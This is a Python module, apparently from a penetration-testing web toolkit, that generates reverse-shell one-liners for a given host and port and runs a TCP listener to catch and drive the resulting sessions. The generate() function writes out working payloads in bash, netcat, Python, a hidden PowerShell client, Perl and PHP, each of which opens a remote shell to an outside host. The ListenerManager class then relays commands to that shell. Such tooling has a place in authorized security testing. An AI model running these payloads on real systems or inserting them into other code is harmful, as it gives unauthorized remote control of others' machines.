#!/usr/bin/env python3
"""
Reverse shell payload generator + a simple catch listener.

Generates the usual copy-paste reverse-shell one-liners for a given
LHOST/LPORT, and offers a minimal TCP listener to catch a connect-back and
interact with it from the web UI.

WARNING: offensive tooling for authorized testing only. Use against systems
you own or have explicit permission to test.
"""

import os
import socket
import threading
import time
import logging
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)

_MAX_OUTPUT = 200_000  # cap the captured buffer (chars)


def get_lan_ip() -> str:
    """Best-effort primary non-loopback IPv4 address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('8.8.8.8', 80))  # no packets sent; just picks the route
            return s.getsockname()[0]
        finally:
            s.close()
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return '127.0.0.1'


def generate(ip: str, port: int, shell: str = '/bin/bash') -> List[Dict]:
    """Return a list of {name, lang, payload} reverse-shell one-liners."""
    ip = (ip or '').strip()
    p = int(port)
    sh = (shell or '/bin/bash').strip()
    items = [
        ('Bash (TCP)', 'bash',
         f"{sh} -i >& /dev/tcp/{ip}/{p} 0>&1"),
        ('Bash (read line)', 'bash',
         f"0<&196;exec 196<>/dev/tcp/{ip}/{p}; {sh} <&196 >&196 2>&196"),
        ('nc (mkfifo)', 'sh',
         f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|nc {ip} {p} >/tmp/f"),
        ('nc -e', 'sh',
         f"nc {ip} {p} -e {sh}"),
        ('Python3', 'python',
         ("python3 -c 'import socket,subprocess,os,pty;"
          f"s=socket.socket();s.connect((\"{ip}\",{p}));"
          "[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"" + sh + "\")'")),
        ('PowerShell', 'powershell',
         ("powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('"
          f"{ip}',{p});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
          "while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object "
          "Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);"
          "$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);"
          "$s.Flush()}\"")),
        ('Perl', 'perl',
         ("perl -e 'use Socket;$i=\"" + ip + f"\";$p={p};"
          "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
          "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"
          "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"" + sh + " -i\");}'")),
        ('PHP', 'php',
         f"php -r '$s=fsockopen(\"{ip}\",{p});exec(\"{sh} -i <&3 >&3 2>&3\");'"),
    ]
    return [{'name': n, 'lang': lang, 'payload': pl} for (n, lang, pl) in items]


class ListenerManager:
    """A single-connection TCP catch listener, driven from the web UI."""

    def __init__(self):
        self._lock = threading.Lock()
        self._srv: Optional[socket.socket] = None
        self._cli: Optional[socket.socket] = None
        self._thread: Optional[threading.Thread] = None
        self._running = False
        self._port: Optional[int] = None
        self._peer = ''
        self._buf = ''

    def _append(self, text: str):
        with self._lock:
            self._buf = (self._buf + text)[-_MAX_OUTPUT:]

    def start(self, port: int) -> Dict:
        with self._lock:
            if self._running:
                return {'success': False, 'error': f'Listener already running on {self._port}'}
        try:
            p = int(port)
            if not (1 <= p <= 65535):
                return {'success': False, 'error': 'Port must be 1-65535'}
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(('0.0.0.0', p))
            srv.listen(1)
            srv.settimeout(1.0)
        except Exception as e:
            return {'success': False, 'error': str(e)}
        with self._lock:
            self._srv = srv
            self._running = True
            self._port = p
            self._peer = ''
            self._buf = f'[*] Listening on 0.0.0.0:{p} …\n'
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()
        return {'success': True, 'port': p}

    def _accept_loop(self):
        while self._running and self._srv:
            try:
                cli, addr = self._srv.accept()
            except socket.timeout:
                continue
            except Exception:
                break
            with self._lock:
                if self._cli is not None:
                    # Already have a session; refuse extra connects.
                    try:
                        cli.close()
                    except Exception:
                        pass
                    continue
                self._cli = cli
                self._peer = f'{addr[0]}:{addr[1]}'
            self._append(f'[+] Connection from {addr[0]}:{addr[1]}\n')
            cli.settimeout(1.0)
            while self._running:
                try:
                    data = cli.recv(4096)
                except socket.timeout:
                    continue
                except Exception:
                    break
                if not data:
                    break
                self._append(data.decode('utf-8', errors='replace'))
            self._append('[-] Session closed\n')
            with self._lock:
                try:
                    cli.close()
                except Exception:
                    pass
                self._cli = None
                self._peer = ''

    def send(self, data: str) -> Dict:
        with self._lock:
            cli = self._cli
        if not cli:
            return {'success': False, 'error': 'No connected session'}
        try:
            cli.sendall((data.rstrip('\n') + '\n').encode('utf-8', errors='replace'))
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def status(self) -> Dict:
        with self._lock:
            return {
                'running': self._running,
                'port': self._port,
                'connected': self._cli is not None,
                'peer': self._peer,
                'output': self._buf,
            }

    def stop(self) -> Dict:
        with self._lock:
            self._running = False
            for sock in (self._cli, self._srv):
                try:
                    if sock:
                        sock.close()
                except Exception:
                    pass
            self._cli = None
            self._srv = None
            self._port = None
            self._peer = ''
        return {'success': True}


# Module-level singleton used by the web routes.
LISTENER = ListenerManager()
